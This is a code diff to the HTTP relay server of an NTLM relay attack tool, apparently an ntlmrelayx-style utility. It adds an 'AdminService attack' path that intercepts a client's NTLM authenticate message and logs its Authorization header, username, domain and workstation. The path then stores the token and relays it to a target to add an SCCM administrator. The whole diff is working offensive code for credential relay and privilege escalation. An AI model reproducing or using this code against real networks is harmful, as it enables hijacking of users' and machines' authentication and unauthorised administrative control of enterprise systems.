@@ -402,6 +402,41 @@ class HTTPRelayServer(Thread):
                 authenticateMessage.fromString(token)
                 self.authUser = authenticateMessage.getUserString()
 
+                # AdminService attack: skip redirect, attack immediately
+                if self.server.config.isADMINAttack:
+                    LOG.info("Exiting standard auth flow to add SCCM admin...")
+
+                    # Log what we received from the client (HTTP)
+                    LOG.info("=== Received Type 3 AUTHENTICATE from Client ===")
+                    LOG.info("Source: HTTP client %s" % self.client_address[0])
+                    LOG.info("Authorization header: %s" % self.headers.get('Authorization', '(missing)'))
+                    LOG.info("User-Agent: %s" % self.headers.get('User-Agent', '(none)'))
+                    LOG.info("Domain: %s" % authenticateMessage['domain_name'])
+                    LOG.info("Username: %s" % authenticateMessage['user_name'])
+                    LOG.info("Workstation: %s" % authenticateMessage['host_name'])
+                    LOG.info("NTLM Flags: 0x%08x" % authenticateMessage['flags'])
+
+                    # Check if this is local auth (empty credentials)
+                    if authenticateMessage['domain_name'] == '' and authenticateMessage['user_name'] == '':
+                        LOG.info("** This is LOCAL AUTH (empty domain/username) **")
+                        LOG.info("** Client is authenticating as its machine account **")
+
+                    LOG.info("=== End Client Type 3 ===")
+
+                    self.server.config.setSCCMAdminToken(token)
+                    self.client.setClientId()
+
+                    # Get target for attack
+                    self.target = self.server.config.target.getTarget(identity=self.authUser)
+                    if self.target is None:
+                        LOG.error("No target available for AdminService attack")
+                        self.send_not_found()
+                        return
+
+                    LOG.info("Authenticating against %s://%s as %s" % (self.target.scheme, self.target.netloc, self.authUser))
+                    self.do_attack()
+                    return
+
                 self.target = self.server.config.target.getTarget(identity = self.authUser)
                 if self.target is None:
                     if self.server.config.keepRelaying:
